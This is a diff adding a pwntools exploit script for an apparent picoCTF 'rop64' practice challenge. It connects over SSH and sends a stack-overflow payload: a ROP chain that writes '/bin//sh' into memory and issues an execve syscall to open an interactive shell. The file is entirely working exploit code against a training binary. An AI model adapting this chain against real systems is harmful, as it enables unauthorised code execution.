@@ -1,0 +1,92 @@
+from pwn import *
+from struct import pack
+
+USER = ""
+PASS = ""
+
+conn = ssh(host="2019shell1.picoctf.com", user=USER, password=PASS)
+conn.set_working_directory(b"/problems/rop64_1_3a135066aff0c433faf93765baaa584d")
+
+# Padding goes here
+p = 'A'*24
+
+p += pack('<Q', 0x00000000004100d3) # pop rsi ; ret
+p += pack('<Q', 0x00000000006b90e0) # @ .data
+p += pack('<Q', 0x00000000004156f4) # pop rax ; ret
+p += '/bin//sh'
+p += pack('<Q', 0x000000000047f561) # mov qword ptr [rsi], rax ; ret
+p += pack('<Q', 0x00000000004100d3) # pop rsi ; ret
+p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
+p += pack('<Q', 0x0000000000444c50) # xor rax, rax ; ret
+p += pack('<Q', 0x000000000047f561) # mov qword ptr [rsi], rax ; ret
+p += pack('<Q', 0x0000000000400686) # pop rdi ; ret
+p += pack('<Q', 0x00000000006b90e0) # @ .data
+p += pack('<Q', 0x00000000004100d3) # pop rsi ; ret
+p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
+p += pack('<Q', 0x00000000004499b5) # pop rdx ; ret
+p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
+p += pack('<Q', 0x0000000000444c50) # xor rax, rax ; ret
+p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
+p += pack('<Q', 0x000000000047b6ff) # syscall
+
+process = conn.process('./vuln')
+process.sendline(p)
+process.interactive()
